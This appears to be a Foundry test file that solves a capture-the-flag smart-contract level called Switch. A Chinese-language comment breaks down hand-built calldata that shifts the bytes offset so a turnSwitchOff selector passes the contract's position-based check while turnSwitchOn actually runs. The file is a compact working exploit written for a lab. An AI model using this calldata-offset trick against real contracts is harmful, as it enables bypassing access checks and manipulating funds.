// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external returns (bool);
}
/* 
// 函数选择器 FlipSwitch(_data)的
30c13ade
// bytes memory _data 偏移量 96
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000000
// turnSwitchOff()的函数选择器：xxxxxxxx 满足条件通过检查
20606e1500000000000000000000000000000000000000000000000000000000
// _data长度
0000000000000000000000000000000000000000000000000000000000000004
// turnSwitchOn()的函数选择器
76227e1200000000000000000000000000000000000000000000000000000000  
 */

contract SwitchTest is BaseTest {
    function test_Attack() public {
        bytes memory data =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        vm.prank(deployer);
        contractAddress.call(data);

        require(ISwitch(contractAddress).switchOn() == true, "Switch is not on");
    }
}